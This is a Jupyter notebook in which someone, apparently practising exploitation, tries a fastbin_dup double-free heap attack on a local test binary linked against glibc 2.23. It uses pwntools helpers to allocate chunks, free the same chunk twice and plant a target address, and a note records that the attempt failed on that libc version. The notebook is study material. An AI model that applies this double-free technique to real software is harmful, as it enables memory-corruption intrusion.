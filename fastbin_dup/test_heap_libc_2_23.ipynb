{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] '/home/bohan/res/ubuntu_share/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    Canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      PIE enabled\n",
      "[*] '/home/bohan/res/ubuntu_share/pwn_test/fastbin_dup/heap_libc_2_23'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    No canary found\n",
      "    NX:       NX disabled\n",
      "    PIE:      No PIE (0x400000)\n",
      "    RWX:      Has RWX segments\n",
      "    RUNPATH:  b'/home/bohan/res/ubuntu_share/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64'\n",
      "[*] '/home/bohan/res/ubuntu_share/pwn_test/fastbin_dup/heap'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    No canary found\n",
      "    NX:       NX disabled\n",
      "    PIE:      No PIE (0x400000)\n",
      "    RWX:      Has RWX segments\n"
     ]
    }
   ],
   "source": [
    "%load_ext autoreload\n",
    "%autoreload 2\n",
    "formatter = get_ipython().display_formatter.formatters['text/plain']\n",
    "formatter.for_type(int, lambda n, p, cycle: p.text(\"0x%X\" % n))\n",
    "\n",
    "import os\n",
    "os.sys.path.append('../')\n",
    "\n",
    "from pwn import *\n",
    "from util import *\n",
    "\n",
    "libc=ELF('/home/bohan/res/ubuntu_share/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so')\n",
    "heap_libc_2_23=ELF('/home/bohan/res/ubuntu_share/pwn_test/fastbin_dup/heap_libc_2_23')\n",
    "heap=ELF('/home/bohan/res/ubuntu_share/pwn_test/fastbin_dup/heap')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'h'"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "chr(0x68)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-25-0a238d91e46d>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mos\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mw_pipe\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "os.read(w_pipe, 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "z_write = write_pipe\n",
    "z_print = lambda *args: None"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [],
   "source": [
    "def send_line(s):\n",
    "    z_write(s + '\\n')\n",
    "    z_print()\n",
    "    \n",
    "def puts(i):\n",
    "    z_write('3 %d\\n' % i, waittime=0.3)\n",
    "    z_print()\n",
    "def malloc_gets(i, length, s):\n",
    "    z_write('1 %d\\n%d ' % (i, length), waittime=0.3)\n",
    "    z_write(s, waittime=0.3, end='\\n')\n",
    "    z_print(False)\n",
    "def free(i):\n",
    "    z_write('2 %d\\n' % i, waittime=0.3)\n",
    "    z_print()\n",
    "def modify(i, s):\n",
    "    z_write('4 %d\\n' % i, waittime=0.3)\n",
    "    z_write(s, waittime=0.3, end='\\n')\n",
    "    z_print()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "以下测试在libc2.23下无法改写任意地址(原因不明)；在有tcache的版本中, 对tcache进行类似fastbin_dup的攻击, 能成功"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 272,
   "metadata": {},
   "outputs": [],
   "source": [
    "malloc_gets(0, 25, 'a')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 273,
   "metadata": {},
   "outputs": [],
   "source": [
    "malloc_gets(1, 25, 'b')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 274,
   "metadata": {},
   "outputs": [],
   "source": [
    "free(0)\n",
    "free(1)\n",
    "free(0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 261,
   "metadata": {},
   "outputs": [],
   "source": [
    "free(0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 275,
   "metadata": {},
   "outputs": [],
   "source": [
    "# malloc_gets(2, 25, p64(0xfb5010))\n",
    "# malloc_gets(2, 25, p64(0x601068))\n",
    "malloc_gets(2, 25, p64(0x601000))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 201,
   "metadata": {},
   "outputs": [],
   "source": [
    "# modify(2, p64(0x601058))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 276,
   "metadata": {},
   "outputs": [],
   "source": [
    "malloc_gets(3, 25, 'd')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 277,
   "metadata": {},
   "outputs": [],
   "source": [
    "malloc_gets(4, 25, 'e')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 285,
   "metadata": {},
   "outputs": [],
   "source": [
    "puts(5)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 278,
   "metadata": {},
   "outputs": [],
   "source": [
    "# malloc_gets(5, 1, p64(0x60100E))\n",
    "malloc_gets(5, 25, 'abcd')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "send_line('0')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [conda env:.conda-mytorch] *",
   "language": "python",
   "name": "conda-env-.conda-mytorch-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
